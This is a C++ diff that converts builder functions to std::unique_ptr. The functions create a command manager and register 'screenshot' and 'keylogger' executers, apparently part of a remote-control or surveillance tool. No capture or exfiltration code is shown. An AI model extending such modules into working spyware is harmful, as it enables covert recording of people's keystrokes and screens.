@@ -2,27 +2,28 @@
 
 #include "command/execute/ScreenshotExecuter.h"
 #include "command/execute/KeyloggerExecuter.h"
+#include "stl/unique.h"
 
 
-command::ICommandExecuter*
+std::unique_ptr<command::ICommandExecuter>
 utils::builders::BuildScreenshotExecuter()
 {
-    return ( new command::ScreenshotExecuter(1, "screenshot") );
+    return ( std::make_unique<command::ScreenshotExecuter>(1, "screenshot") );
 }
 
-command::ICommandExecuter*
+std::unique_ptr<command::ICommandExecuter>
 utils::builders::BuildKeyloggerExecuter()
 {
-    return ( new command::KeyloggerExecuter(2, "keylogger") );
+    return ( std::make_unique<command::KeyloggerExecuter>(2, "keylogger") );
 }
 
-command::CommandManager*
+std::unique_ptr<command::CommandManager>
 utils::builders::BuildManager()
 {
-    command::CommandManager *dispatcher = new command::CommandManager();
+    auto dispatcher = std::make_unique<command::CommandManager>();
 
-    dispatcher->Add(BuildScreenshotExecuter());
-    dispatcher->Add(BuildKeyloggerExecuter());
+    dispatcher->Add(BuildScreenshotExecuter().release());
+    dispatcher->Add(BuildKeyloggerExecuter().release());
 
     return ( dispatcher );
 }
